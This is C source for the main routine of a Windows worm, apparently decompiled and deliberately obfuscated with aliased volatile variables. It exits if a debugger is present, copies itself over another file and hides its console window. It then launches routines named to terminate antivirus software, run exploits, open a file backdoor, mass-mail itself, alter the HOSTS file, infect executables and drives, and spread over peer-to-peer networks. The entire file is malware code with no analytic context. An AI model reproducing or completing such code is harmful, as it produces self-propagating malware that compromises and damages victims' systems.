#include "data_globals.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma optimize("", off)
int main(int argc, char **argv, char **env)
{
    // Transformed scalar variables using pointer aliasing
    volatile BOOL is_debugger_present_buf[2] = {{0, (BOOL)0}};
    volatile BOOL *p_is_debugger_present = (volatile BOOL *)&is_debugger_present_buf[0];

    volatile int result_buf[2] = {{0, (int)0}};
    volatile int *p_result = (volatile int *)&result_buf[0];

    volatile DWORD last_error_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_last_error = (volatile DWORD *)&last_error_buf[0];

    volatile HWND hWnd_buf[2] = {{NULL, (HWND)0}};
    volatile HWND *p_hWnd = (volatile HWND *)&hWnd_buf[0];

    // Array remains unchanged
    CHAR local_110[256];

    (*p_is_debugger_present) = IsDebuggerPresent();
    if ((*p_is_debugger_present) == 0) {
        if (argc == 2) {
            GetModuleFileNameA(NULL, local_110, sizeof(local_110));
            if (strcmp(argv[1], local_110) != 0) {
                SetFileAttributesA(argv[1], FILE_ATTRIBUTE_NORMAL);
                CopyFileA(local_110, argv[1], FALSE);
            }
        }
        CreateMutexA(NULL, FALSE, "Wer45bbrtb439");
        (*p_last_error) = GetLastError();
        if ((*p_last_error) == ERROR_ALREADY_EXISTS) {
            (*p_result) = 1;
        } else {
            AllocConsole();
            (*p_hWnd) = FindWindowA("ConsoleWindowClass", NULL);
            ShowWindow((*p_hWnd), SW_HIDE);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_AntiVirusTerminate, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ExploitMain, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_FileBackdoor, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_MassMailMain, NULL, 0, NULL);
            _Install();
            _HOSTSFile();
            _InfectExes();
            p2p_spread();
            InfectDrives();
            (*p_result) = 0;
        }
    } else {
        (*p_result) = 1;
    }
    return (*p_result);
}
#pragma optimize("", on)
